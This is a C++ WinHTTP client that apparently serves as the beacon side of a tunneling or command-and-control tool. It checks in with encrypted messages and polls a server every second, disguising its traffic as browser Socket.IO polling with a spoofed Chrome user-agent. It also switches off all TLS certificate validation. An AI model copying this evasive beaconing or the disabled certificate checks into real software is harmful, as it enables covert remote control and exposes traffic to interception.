#include "http_messenger_client.h"

#include <iostream>
#include <stdexcept>
#include <thread>
#include <chrono>

static const std::string HTTP_ROUTE = "socketio/?EIO=4&transport=polling";

static std::wstring to_wstring(const std::string& s) {
    return std::wstring(s.begin(), s.end());
}

// Parse a URL like http://host:port/path or https://host:port/path
static void parse_url(const std::string& url,
                      std::string& host, INTERNET_PORT& port,
                      std::string& path, bool& use_ssl) {
    std::string remainder = url;

    if (remainder.rfind("https://", 0) == 0) {
        use_ssl = true;
        remainder = remainder.substr(8);
    } else if (remainder.rfind("http://", 0) == 0) {
        use_ssl = false;
        remainder = remainder.substr(7);
    } else {
        use_ssl = false;
    }

    // Strip trailing slash before appending route
    while (!remainder.empty() && remainder.back() == '/') {
        remainder.pop_back();
    }

    auto slash_pos = remainder.find('/');
    std::string host_port;
    if (slash_pos != std::string::npos) {
        host_port = remainder.substr(0, slash_pos);
        path = remainder.substr(slash_pos);
    } else {
        host_port = remainder;
        path = "/";
    }

    // Append the route
    if (path.back() != '/') path += '/';
    path += HTTP_ROUTE;

    auto colon_pos = host_port.find(':');
    if (colon_pos != std::string::npos) {
        host = host_port.substr(0, colon_pos);
        port = static_cast<INTERNET_PORT>(std::stoi(host_port.substr(colon_pos + 1)));
    } else {
        host = host_port;
        port = use_ssl ? INTERNET_DEFAULT_HTTPS_PORT : INTERNET_DEFAULT_HTTP_PORT;
    }
}

HTTPMessengerClient::HTTPMessengerClient(
    const std::string& uri,
    const std::vector<uint8_t>& encryption_key
) : encryption_key_(encryption_key) {
    parse_url(uri, host_, port_, path_, use_ssl_);
}

HTTPMessengerClient::~HTTPMessengerClient() {
    cleanup();
}

void HTTPMessengerClient::cleanup() {
    if (h_connect_) { WinHttpCloseHandle(h_connect_); h_connect_ = nullptr; }
    if (h_session_) { WinHttpCloseHandle(h_session_); h_session_ = nullptr; }
}

std::vector<uint8_t> HTTPMessengerClient::post_binary(const std::vector<uint8_t>& data) {
    HINTERNET h_request = WinHttpOpenRequest(
        h_connect_,
        L"POST",
        to_wstring(path_).c_str(),
        nullptr,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        use_ssl_ ? WINHTTP_FLAG_SECURE : 0
    );

    if (!h_request) {
        throw std::runtime_error("WinHttpOpenRequest failed: " + std::to_string(GetLastError()));
    }

    // Ignore SSL cert errors
    if (use_ssl_) {
        DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                      SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                      SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                      SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
        WinHttpSetOption(h_request, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));
    }

    LPCWSTR content_type = L"Content-Type: application/octet-stream";

    BOOL result = WinHttpSendRequest(
        h_request,
        content_type,
        static_cast<DWORD>(-1),
        const_cast<uint8_t*>(data.data()),
        static_cast<DWORD>(data.size()),
        static_cast<DWORD>(data.size()),
        0
    );

    if (!result) {
        WinHttpCloseHandle(h_request);
        throw std::runtime_error("WinHttpSendRequest failed: " + std::to_string(GetLastError()));
    }

    result = WinHttpReceiveResponse(h_request, nullptr);
    if (!result) {
        WinHttpCloseHandle(h_request);
        throw std::runtime_error("WinHttpReceiveResponse failed: " + std::to_string(GetLastError()));
    }

    // Check status code
    DWORD status_code = 0;
    DWORD size = sizeof(status_code);
    WinHttpQueryHeaders(h_request,
        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        WINHTTP_HEADER_NAME_BY_INDEX, &status_code, &size, WINHTTP_NO_HEADER_INDEX);

    if (status_code < 200 || status_code >= 300) {
        WinHttpCloseHandle(h_request);
        throw std::runtime_error("HTTP " + std::to_string(status_code));
    }

    // Read response body
    std::vector<uint8_t> response;
    DWORD bytes_available = 0;
    DWORD bytes_read = 0;

    do {
        bytes_available = 0;
        WinHttpQueryDataAvailable(h_request, &bytes_available);

        if (bytes_available > 0) {
            std::vector<uint8_t> buffer(bytes_available);
            WinHttpReadData(h_request, buffer.data(), bytes_available, &bytes_read);
            response.insert(response.end(), buffer.begin(), buffer.begin() + bytes_read);
        }
    } while (bytes_available > 0);

    WinHttpCloseHandle(h_request);
    return response;
}

void HTTPMessengerClient::connect() {
    std::cout << "[HTTP] Connecting to " << (use_ssl_ ? "https" : "http") << "://"
              << host_ << ":" << port_ << path_ << std::endl;

    h_session_ = WinHttpOpen(
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0
    );

    if (!h_session_) {
        throw std::runtime_error("WinHttpOpen failed: " + std::to_string(GetLastError()));
    }

    h_connect_ = WinHttpConnect(h_session_, to_wstring(host_).c_str(), port_, 0);
    if (!h_connect_) {
        cleanup();
        throw std::runtime_error("WinHttpConnect failed: " + std::to_string(GetLastError()));
    }

    // Initial check-in
    auto check_in = CheckInMessage{""};
    std::vector<Message> msgs = {Message{check_in}};
    auto payload = serialize_messages(encryption_key_, msgs);

    auto response_data = post_binary(payload);

    auto response_msgs = deserialize_messages(encryption_key_, response_data);
    if (response_msgs.empty()) {
        cleanup();
        throw std::runtime_error("Empty response from server");
    }

    auto* check_in_response = std::get_if<CheckInMessage>(&response_msgs[0]);
    if (!check_in_response) {
        cleanup();
        throw std::runtime_error("Expected CheckInMessage from server");
    }

    messenger_id_ = check_in_response->messenger_id;
    std::cout << "[+] Connected to server with Messenger ID: " << messenger_id_ << std::endl;

    poll_server();
}

void HTTPMessengerClient::poll_server() {
    while (true) {
        try {
            std::vector<Message> msgs;
            msgs.push_back(Message{CheckInMessage{messenger_id_}});

            {
                std::lock_guard<std::mutex> lock(downstream_mutex_);
                while (!downstream_messages_.empty()) {
                    msgs.push_back(downstream_messages_.front());
                    downstream_messages_.pop();
                }
            }

            auto payload = serialize_messages(encryption_key_, msgs);
            auto response_data = post_binary(payload);

            auto response_msgs = deserialize_messages(encryption_key_, response_data);
            for (const auto& msg : response_msgs) {
                std::thread([this, msg]() { handle_message(msg); }).detach();
            }

            std::this_thread::sleep_for(std::chrono::seconds(1));
        } catch (const std::exception& ex) {
            std::cerr << "[!] HTTP poll error: " << ex.what() << std::endl;
            break;
        }
    }
}

void HTTPMessengerClient::send_downstream_message(const Message& message) {
    std::lock_guard<std::mutex> lock(downstream_mutex_);
    downstream_messages_.push(message);
}

void HTTPMessengerClient::handle_message(const Message& message) {
    MessengerClient::handle_message(message);
}
